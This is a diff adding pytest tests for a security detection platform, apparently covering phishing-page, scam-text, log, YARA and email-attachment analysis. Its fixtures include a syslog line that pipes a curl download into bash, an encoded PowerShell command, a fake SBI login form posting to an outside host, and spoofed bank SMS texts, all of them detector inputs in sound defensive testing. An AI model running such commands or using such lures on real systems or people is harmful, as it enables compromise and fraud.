@@ -7,6 +7,7 @@ import types
 
 import pytest
 import numpy as np
+import main
 from fastapi import HTTPException, UploadFile
 
 from main import (
@@ -55,12 +56,15 @@ from database import PostgresConnection, _postgresql_statement
 from ephemeral_store import EphemeralStore
 from cloudflare_waf import block_ip as cloudflare_block_ip
 from production_integrations import IntegrationNotConfigured, create_ticket as create_production_ticket
+from playbook_engine import load_playbooks, plan_playbook
 from email_authenticity import analyze_eml, verify_sender_identity
 from deepfake_models import _is_suspicious_label, _prepare_audio_waveform
 from evaluate_media_dataset import calculate_metrics as calculate_media_metrics
 from media_engine import media_inspection_status
 from evaluate_public_datasets import evaluate as evaluate_public_text_dataset
 import detection_engine
+import geoip_enrichment
+import malware_scanner
 import deepfake_models
 from campaign_engine import correlate_incident
 from train_model import DEFAULT_DATASET, train as train_text_model
@@ -81,6 +85,7 @@ from prevention_engine import (
 )
 from threat_fusion import compute_drift_snapshot, detect_memory_hits, generate_attacker_intent
 from account_rescue_engine import consent_record, contact_warning_draft, execute_step, fleet_summary, provider_capabilities, rescue_plan, rescue_report, rescue_simulation, scan_account
+from regional_scam_detector import analyze_regional_scam
 
 
 def test_core_operator_workflow():
@@ -314,6 +319,20 @@ def test_website_inspector_rejects_non_global_dns_answers(monkeypatch):
         website_inspector._safe_addresses("public-looking.example")
 
 
+def test_website_dom_identity_flags_branded_credential_clone():
+    identity = website_inspector.analyze_page_identity(
+        "https://account-verify.example/login",
+        '<html><head><title>SBI Secure Login</title><meta property="og:site_name" content="SBI"></head>'
+        '<body><img alt="SBI logo"><form action="https://collect.example/submit">'
+        '<input type="password"></form></body></html>',
+    )
+
+    assert identity["credential_form"] is True
+    assert identity["claimed_brands"] == ["sbi"]
+    assert "sbi" in identity["brand_mismatches"]
+    assert identity["cross_origin_form_actions"] == ["collect.example"]
+
+
 def test_website_inspector_rechecks_redirect_targets_and_closes_streams(monkeypatch):
     requests_made = []
 
@@ -391,12 +410,46 @@ def test_website_inspector_accepts_public_page_and_closes_response(monkeypatch):
     session = Session()
     monkeypatch.setattr(website_inspector.requests, "Session", lambda: session)
     monkeypatch.setattr(website_inspector.socket, "getaddrinfo", lambda *args, **kwargs: [(None, None, None, None, ("93.184.216.34", 0))])
+    monkeypatch.setattr(website_inspector, "_certificate_details", lambda hostname, address, port: {"status": "verified", "verified": True, "issuer": "Test CA", "issued_at": "2026-01-01T00:00:00+00:00", "expires_at": "2026-10-01T00:00:00+00:00", "age_days": 272, "days_remaining": 1})
+    monkeypatch.setattr(website_inspector, "_domain_registration", lambda domain: {"status": "available", "available": True, "registered_at": "2026-09-01T00:00:00+00:00", "age_days": 29})
 
     result = website_inspector.inspect_website("https://public.example/")
 
     assert result["title"] == "Safe page"
+    assert result["tls_certificate"]["issuer"] == "Test CA"
+    assert result["domain_registration"]["age_days"] == 29
+    assert any("expires in 1 days" in finding for finding in result["findings"])
+    assert any("registered recently" in finding for finding in result["findings"])
     assert response.closed is True
     assert session.closed is True
+
+
+def test_website_enrichment_changes_assessment_risk(monkeypatch):
+    monkeypatch.setattr("main.inspect_website", lambda url: {
+        "final_url": url,
+        "title": "Example",
+        "findings": [],
+        "tls_certificate": {"verified": True, "days_remaining": 7},
+        "domain_registration": {"available": True, "age_days": 10},
+    })
+    monkeypatch.setattr("main.evaluate_threat_payload", lambda category, payload: {
+        "risk_score": 10,
+        "risk_level": "Safe",
+        "indicators": [],
+        "recommended_actions": [{"id": "warn_user", "label": "Warn"}],
+        "xai_explanation": "Safe Risk: baseline.",
+        "explanation_summary": "Baseline.",
+    })
+    monkeypatch.setattr("main.store_incident", lambda *args, **kwargs: 1)
+    monkeypatch.setattr("main.persist_cyberguard_x", lambda *args, **kwargs: None)
+    monkeypatch.setattr("main.write_audit", lambda *args, **kwargs: None)
+
+    result = analyze_website({"url": "https://recent.example"}, {"username": "analyst"})
+
+    assert result["assessment"]["risk_score"] == 55
+    assert result["assessment"]["risk_level"] == "Medium"
+    assert {item["name"] for item in result["assessment"]["indicators"]} == {"TLS Certificate Expiry", "Domain Registration Age"}
+    assert "recent (10 days old)" in result["assessment"]["xai_explanation"]
 
 
 def test_pinned_website_adapter_connects_to_resolved_ip_and_keeps_tls_hostname(monkeypatch):
@@ -602,7 +655,7 @@ def test_text_model_risk_gate_uses_configured_confidence_threshold(monkeypatch):
     gated = detection_engine.evaluate_threat_payload("email", "A routine note")
 
     assert enabled["risk_score"] == 55
-    assert gated["risk_score"] == 6
+    assert gated["risk_score"] == 5
 
 
 def test_text_training_defaults_to_uci_and_saves_a_usable_artifact(tmp_path):
@@ -1199,3 +1252,270 @@ def test_account_rescue_supporting_features_are_safe_and_explicit():
     assert consent_record("google", ["readonly"], "scan")["status"] == "awaiting_confirmation"
     assert contact_warning_draft("demo", ["a@example.com"])["requires_explicit_send"] is True
     assert fleet_summary([{"label": "finance", "risk": 90, "consent": True}])["accounts"][0]["rescue_available"] is True
+
+
+def test_regional_scam_detection_requires_correlated_signals():
+    benign = "Urgent payment transfer for the government officer refund."
+    scam = "Police says digital arrest. Do not disconnect and transfer money now."
+
+    assert analyze_regional_scam(benign)[0] == 0
+    assert "digital-arrest" in analyze_regional_scam(scam)[4]
+
+
+def test_auth_log_and_ato_categories_share_the_same_scorer(monkeypatch):
+    monkeypatch.setattr(detection_engine, "model_signal", lambda payload: (0, None))
+    payload = '{"failed_attempts": 8, "total_attempts": 10, "distinct_accounts": 6, "new_device": true}'
+
+    ato = detection_engine.evaluate_threat_payload("ato", payload)
+    auth_logs = detection_engine.evaluate_threat_payload("auth_logs", payload)
+
+    assert ato["risk_score"] == auth_logs["risk_score"]
+    assert ato["detection_method"] == auth_logs["detection_method"] == "shared-authentication-risk"
+
+
+def test_url_intelligence_flags_expanded_brand_lookalikes():
+    score, reasons, _ = detection_engine.analyze_url_intelligence("https://sbi-account-verify.online/login")
+
+    assert score >= 55
+    assert any("look-alike" in reason.lower() or "typosquatting" in reason.lower() for reason in reasons)
+
+
+def test_brand_domains_load_from_validated_configuration(tmp_path):
+    config = tmp_path / "brands.json"
+    config.write_text(json.dumps({"brands": {"sbi": "sbi.co.in", "custombank": "login.invalid_domain", "x": "short.com"}}), encoding="utf-8")
+
+    assert detection_engine.load_brand_domains(config) == {"sbi": "sbi.co.in"}
+
+
+def test_phishing_text_uses_contextual_risk_and_shared_url_intelligence(monkeypatch):
+    monkeypatch.setattr(detection_engine, "model_signal", lambda payload: (0, None))
+    benign = detection_engine.evaluate_threat_payload("email", "Urgent payment transfer for the government officer refund.")
+    short_link = detection_engine.evaluate_threat_payload("sms", "Your KYC and OTP are required; use this link: https://bit.ly/secure-check")
+    bank_spoof = detection_engine.evaluate_threat_payload("sms", "SBI account locked. Verify at https://sbi-account-lock.online/login")
+
+    assert benign["risk_score"] < 20
+    assert benign["regional_categories"] == []
+    assert short_link["risk_score"] >= 55
+    assert bank_spoof["risk_score"] >= 60
+
+
+def test_login_baseline_learns_successful_samples_per_account(monkeypatch, tmp_path):
+    monkeypatch.setattr("main.DB_PATH", tmp_path / "login-baseline.sqlite")
+    initialize_database()
+    user = {"username": "analyst"}
+
+    for _ in range(3):
+        assessment = {"risk_score": 5, "risk_level": "Safe", "indicators": [], "recommended_actions": [], "xai_explanation": "Baseline.", "explanation_summary": "Baseline."}
+        main.apply_user_login_baseline(assessment, json.dumps({"account_id": "account-1", "success": True, "country": "IN", "device_id": "known-device", "hour": 9}), user)
+
+    changed_device = {"risk_score": 5, "risk_level": "Safe", "indicators": [], "recommended_actions": [], "xai_explanation": "Baseline.", "explanation_summary": "Baseline."}
+    main.apply_user_login_baseline(changed_device, json.dumps({"account_id": "account-1", "country": "IN", "device_id": "new-device", "hour": 9}), user, learn=False)
+    other_account = {"risk_score": 5, "risk_level": "Safe", "indicators": [], "recommended_actions": [], "xai_explanation": "Baseline.", "explanation_summary": "Baseline."}
+    main.apply_user_login_baseline(other_account, json.dumps({"account_id": "account-2", "country": "IN", "device_id": "new-device", "hour": 9}), user, learn=False)
+
+    assert changed_device["risk_score"] == 30
+    assert changed_device["login_baseline"] == {"status": "active", "samples": 3, "signals": 1}
+    assert other_account["risk_score"] == 5
+    assert other_account["login_baseline"]["status"] == "calibrating"
+
+    monkeypatch.setattr(main, "lookup_geoip_country", lambda address: {"status": "located", "country": "US"})
+    changed_country = {"risk_score": 5, "risk_level": "Safe", "indicators": [], "recommended_actions": [], "xai_explanation": "Baseline.", "explanation_summary": "Baseline."}
+    main.apply_user_login_baseline(changed_country, json.dumps({"account_id": "account-1", "country": "IN", "source_ip": "8.8.8.8", "device_id": "known-device", "hour": 9}), user, learn=False)
+
+    assert changed_country["risk_score"] == 25
+    assert changed_country["geoip"] == {"status": "located", "country": "US"}
+
+
+def test_geoip_lookup_validates_addresses_and_reads_local_country_database(monkeypatch, tmp_path):
+    database = tmp_path / "GeoLite2-Country.mmdb"
+    database.write_bytes(b"test")
+    country_result = types.SimpleNamespace(country=types.SimpleNamespace(iso_code="US"))
+    monkeypatch.setattr(geoip_enrichment, "_reader", lambda path: types.SimpleNamespace(country=lambda address: country_result))
+
+    assert geoip_enrichment.lookup_country("8.8.8.8", str(database)) == {"status": "located", "country": "US"}
+    assert geoip_enrichment.lookup_country("127.0.0.1", str(database))["status"] == "non_public_address"
+    assert geoip_enrichment.lookup_country("invalid", str(database))["status"] == "invalid_address"
+
+
+def test_malware_scanner_reports_yara_matches_and_unavailable_runtime(monkeypatch):
+    class FakeMatch:
+        rule = "Test_Signature"
+        namespace = "default"
+        meta = {"risk_score": 91}
+
+    class FakeRules:
+        def match(self, data):
+            return [FakeMatch()] if b"test signature" in data else []
+
+    class FakeYara:
+        @staticmethod
+        def compile(filepath):
+            return FakeRules()
+
+    monkeypatch.setattr(malware_scanner, "_load_yara", lambda: FakeYara())
+    detected = malware_scanner.scan_artifact(b"test signature", "sample.bin")
+    clean_result = malware_scanner.scan_artifact(b"ordinary data", "sample.bin")
+    monkeypatch.setattr(malware_scanner, "_load_yara", lambda: (_ for _ in ()).throw(ImportError()))
+    unavailable = malware_scanner.scan_artifact(b"ordinary data", "sample.bin")
+
+    assert detected["status"] == "matches_found"
+    assert detected["risk_score"] == 91
+    assert clean_result["status"] == "scanned_no_match"
+    assert "not proof" in clean_result["reasons"][0]
+    assert unavailable["status"] == "unavailable"
+
+
+def test_bundled_yara_rules_detect_the_eicar_test_string():
+    eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
+
+    result = malware_scanner.scan_artifact(eicar, "eicar.com")
+
+    assert result["status"] == "matches_found"
+    assert result["risk_score"] == 99
+    assert result["matches"][0]["rule"] == "EICAR_Antivirus_Test_File"
+
+
+def test_uploaded_malware_scan_updates_final_risk_and_explanation(monkeypatch, tmp_path):
+    monkeypatch.setattr("main.DB_PATH", tmp_path / "malware-upload.sqlite")
+    initialize_database()
+    monkeypatch.setattr("main.scan_artifact", malware_scanner.scan_artifact)
+    monkeypatch.setattr("main.analyze_media", lambda *args: {"score": 0, "indicators": [], "reasons": [], "method": "unsupported-file"})
+    monkeypatch.setattr("main.persist_cyberguard_x", lambda *args, **kwargs: None)
+    monkeypatch.setattr("main.write_audit", lambda *args, **kwargs: None)
+    monkeypatch.setattr("main.create_notification", lambda *args, **kwargs: None)
+    monkeypatch.setattr("main.evaluate_threat_payload", lambda category, payload: {
+        "risk_score": 5,
+        "risk_level": "Safe",
+        "indicators": [],
+        "recommended_actions": [{"id": "warn_user", "label": "Warn"}],
+        "xai_explanation": "Safe Risk: file triage.",
+        "explanation_summary": "File triage.",
+    })
+    eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
+
+    result = asyncio.run(analyze_file(
+        category="malware",
+        file=UploadFile(file=io.BytesIO(eicar), filename="eicar.com"),
+        metadata="{}",
+        user={"username": "analyst", "role": "analyst"},
+    ))
+
+    assert result["assessment"]["malware_scan"]["status"] == "matches_found"
+    assert result["assessment"]["risk_level"] == "Critical"
+    assert result["assessment"]["xai_explanation"].startswith("Critical Risk:")
+
+
+def test_network_flow_and_api_rate_analytics_use_structured_fields():
+    flows = {"flows": [{"src_ip": "198.51.100.7", "destination_ports": list(range(20, 45)), "bytes_out": 24_000_000, "bytes_in": 100_000}]}
+    network_score, network_reasons, network_indicators = detection_engine.analyze_technical_activity(json.dumps(flows), "network")
+    api_event = {"request_count": 2400, "window_seconds": 60}
+    api_score, api_reasons, _ = detection_engine.analyze_technical_activity(json.dumps(api_event), "api_logs")
+
+    assert network_score >= 80
+    assert any("destination ports" in reason for reason in network_reasons)
+    assert {item["name"] for item in network_indicators} >= {"Flow Port-Scan Breadth", "Outbound Flow Volume Ratio"}
+    assert api_score >= 60
+    assert any("requests per minute" in reason for reason in api_reasons)
+
+
+def test_system_log_analytics_detect_security_events_and_failure_bursts():
+    records = [
+        {"event_id": 1102, "event_type": "audit_log_cleared"},
+        {"event_id": 7045, "event_type": "service_installed", "image_path": "C:\\Users\\Public\\AppData\\Local\\Temp\\powershell.exe"},
+        *[{"event_id": 4625, "event_type": "failed_login"} for _ in range(10)],
+    ]
+    score, reasons, indicators = detection_engine.analyze_technical_activity(json.dumps({"events": records}), "system_logs")
+
+    assert score >= 90
+    assert any("audit-log clearing" in reason for reason in reasons)
+    assert any("10 failed authentication events" in reason for reason in reasons)
+    assert {item["name"] for item in indicators} >= {"Audit Log Cleared", "New Service Installation", "Suspicious Service Executable", "System Authentication Failure Burst"}
+
+
+def test_system_log_parser_accepts_windows_xml_jsonl_and_linux_syslog():
+    windows_xml = (
+        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
+        "<System><EventID>1102</EventID><TimeCreated SystemTime=\"2026-09-30T10:00:00Z\" />"
+        "<Computer>host-01</Computer></System><EventData /></Event>"
+    )
+    xml_score, xml_reasons, _ = detection_engine.analyze_technical_activity(windows_xml, "system_logs")
+    windows_json_line = json.dumps({
+        "Event": {
+            "System": {"EventID": {"#text": "7045"}, "Computer": "host-02"},
+            "EventData": {"Data": [{"@Name": "ImagePath", "#text": "C:\\Windows\\Temp\\powershell.exe"}]},
+        },
+    })
+    jsonl_score, jsonl_reasons, _ = detection_engine.analyze_technical_activity(windows_json_line, "system_logs")
+    encoded_process = json.dumps({
+        "Event": {
+            "System": {"EventID": {"#text": "4688"}},
+            "EventData": {"Data": [
+                {"@Name": "NewProcessName", "#text": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
+                {"@Name": "CommandLine", "#text": "powershell.exe -EncodedCommand SQBFAFgA"},
+            ]},
+        },
+    })
+    process_score, process_reasons, process_indicators = detection_engine.analyze_technical_activity(encoded_process, "system_logs")
+    benign_process = json.dumps({"event_id": 4688, "event_type": "process_start", "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "command": "powershell.exe Get-Service"})
+    benign_process_score, _, benign_process_indicators = detection_engine.analyze_technical_activity(benign_process, "system_logs")
+    failed_syslog = "\n".join(
+        f"Oct 11 22:14:{index:02d} host sshd[123]: Failed password for invalid user admin from 203.0.113.8 port 22 ssh2"
+        for index in range(10)
+    )
+    syslog_score, syslog_reasons, _ = detection_engine.analyze_technical_activity(failed_syslog, "system_logs")
+    shell_syslog = "Oct 11 22:14:16 host cron[456]: curl https://updates.example/payload | bash"
+    shell_score, _, shell_indicators = detection_engine.analyze_technical_activity(shell_syslog, "system_logs")
+    benign_syslog = "Oct 11 22:14:15 host sshd[123]: Accepted publickey for analyst from 203.0.113.8 port 22 ssh2"
+    benign_score, benign_reasons, _ = detection_engine.analyze_technical_activity(benign_syslog, "system_logs")
+
+    assert xml_score >= 60
+    assert any("audit-log clearing" in reason for reason in xml_reasons)
+    assert jsonl_score >= 50
+    assert any("suspicious executable path" in reason for reason in jsonl_reasons)
+    assert process_score >= 45
+    assert any("download/encoded-command" in reason for reason in process_reasons)
+    assert any(item["name"] == "Suspicious Process Creation" for item in process_indicators)
+    assert benign_process_score == 15
+    assert not any(item["name"] == "Suspicious Process Creation" for item in benign_process_indicators)
+    assert syslog_score >= 60
+    assert any("10 failed authentication events" in reason for reason in syslog_reasons)
+    assert shell_score >= 45
+    assert any(item["name"] == "Suspicious Process Creation" for item in shell_indicators)
+    assert benign_score == 15
+    assert benign_reasons == []
+
+
+def test_eml_attachment_metadata_and_text_are_inspected():
+    result = analyze_eml(
+        b"From: sender@example.com\r\n"
+        b"Subject: Document\r\n"
+        b"MIME-Version: 1.0\r\n"
+        b"Content-Type: multipart/mixed; boundary=sample\r\n\r\n"
+        b"--sample\r\nContent-Type: text/plain; charset=utf-8\r\n"
+        b"Content-Disposition: attachment; filename=details.txt\r\n\r\n"
+        b"Visit https://credential-check.example/login\r\n"
+        b"--sample\r\nContent-Type: application/octet-stream\r\n"
+        b"Content-Disposition: attachment; filename=invoice.exe\r\n"
+        b"Content-Transfer-Encoding: base64\r\n\r\n"
+        b"TVqQ\r\n--sample--\r\n"
+    )
+
+    assert "credential-check.example" in result["payload"]
+    assert len(result["attachments"]) == 2
+    assert result["attachments"][0]["status"] == "text_content_scanned"
+    assert result["attachments"][1]["status"] == "active_content_review"
+    assert any(indicator["name"] == "Risky Email Attachment Type" for indicator in result["indicators"])
+
+
+def test_category_playbooks_are_dry_run_and_approval_gated():
+    playbooks = {playbook["id"]: playbook for playbook in load_playbooks()}
+    assessment = {"risk_level": "Critical", "category": "ato"}
+
+    plan = plan_playbook(playbooks["ato-containment"], assessment)
+    wrong_category = plan_playbook(playbooks["ato-containment"], {"risk_level": "Critical", "category": "url"}, approved=True)
+
+    assert len(playbooks) >= 4
+    assert plan["matched"] is True
+    assert plan["mode"] == "dry-run"
+    assert wrong_category["matched"] is False
+    assert wrong_category["actions"] == []
